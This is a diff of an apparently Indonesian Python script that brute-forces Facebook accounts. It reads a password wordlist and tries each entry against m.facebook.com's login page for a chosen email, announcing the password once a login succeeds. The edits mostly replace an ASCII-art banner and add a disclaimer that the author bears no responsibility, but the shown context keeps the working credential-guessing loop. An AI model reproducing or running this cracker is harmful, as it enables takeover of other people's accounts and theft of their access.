@@ -32,6 +32,20 @@ REAPER = ("""
     \033[36;1m===========================================================
     \033[33;1m>~>~>~>~>~>~>~>~>~>~>\033[35;1m~~~~~~~~~~~~~~~~\033[33;1m<~<~<~<~<~<~<~<~<~<~<~
     \033[36;1m<\033[35;1m===================\033[33;1m[ \033[31;1mSilahkan Crack\033[33;1m]\033[35;1m====================\033[36;1m>""")
+
+REZA = ("""
+\033[31;1m╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗
+\033[31;1m║╔═╗║║╔═╗║║╔═╗║║╔═╗║║╔══╝║╔═╗║
+\033[31;1m║╚═╝║║╚═╝║║║─║║║╚══╗║╚══╗║╚══╗
+\033[37;1m║╔══╝║╔╗╔╝║║─║║╚══╗║║╔══╝╚══╗║
+\033[37;1m║║───║║║╚╗║╚═╝║║╚═╝║║╚══╗║╚═╝║
+\033[37;1m╚╝───╚╝╚═╝╚═══╝╚═══╝╚═══╝╚═══╝
+
+              \033[33;1m╔═╗╔═╗╔══╗╔═╗╔╦╗╔══╗╔═╦╗╔══╗
+              \033[32;1m║╔╝║╬║║╔╗║║╔╝║╔╝╚║║╝║║║║║╔═╣
+              \033[32;1m║╚╗║╗╣║╠╣║║╚╗║╚╗╔║║╗║║║║║╚╗║
+              \033[33;1m╚═╝╚╩╝╚╝╚╝╚═╝╚╩╝╚══╝╚╩═╝╚══╝
+""")
 #mulai
 os.system('xdg-open https://www.youtube.com/channel/UC5zJsltM9leQwjvYqrA_r5Q')
 os.system('clear')
@@ -46,8 +60,9 @@ if exist == False:
 else:
           url = 'https://m.facebook.com/login.php'
           os.system('clear')
-          print(REAPER)
-          print('\n\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1mMulai Crack \033[35;1m: '+ email)
+          print(REZA)
+          print('\n\033[37;1m[\033[31;1m!\033[37;1m] \033[37;7mGunakanlah Sc Ini Dengan Bijak Karena \033[31;1mAdmin \033[37;7mTidak Bertanggung Jawab\033[31;7m!!')
+          print('\n\033[37;1m[\033[31;1m!\033[37;7m]\033[37;1mMulai Crack \033[35;1m: '+ email)
           arq = open(word, 'r').readlines()
           for line in arq:
                 password = line.strip()
@@ -58,7 +73,7 @@ else:
                 sd = http.url
                 if 'home.php'in sd:
                   os.system('clear')
-                  print(REAPER)
+                  print(REZA)
                   print('[+] Password di Temukan!')
                   print('[+] Password Adalah : '+password)
                   exit()
